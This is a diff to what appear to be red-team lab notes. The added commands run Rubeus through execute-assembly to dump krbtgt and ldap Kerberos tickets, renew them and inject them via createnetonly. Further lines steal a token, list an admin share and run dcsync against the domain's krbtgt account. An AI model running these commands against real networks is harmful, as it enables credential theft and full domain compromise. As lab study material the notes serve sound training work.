@@ -25,13 +25,25 @@ execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe crede
 ```powershell
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
 
-execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x64fa3 /service:krbtgt /nowrap
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x13491f /service:krbtgt /nowrap
+
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x13491f /service:ldap /nowrap
 ```
 
 ```powershell
-C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /ticket:doIFq[...snip...]uQ09N
+C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /ticket:
 
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe renew /ticket:doIFq[...snip...]uQ09N /nowrap
+```
+
+```powershell
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DUBLIN.CONTOSO.COM /username:nwallace /password:FakePass /ticket:
+
+steal_token [PID]
+run klist
+
+ls \\lon-fs-1\c$
+dcsync DUBLIN.CONTOSO.COM DUBLIN\krbtgt
 ```
  
  Kerberoasting
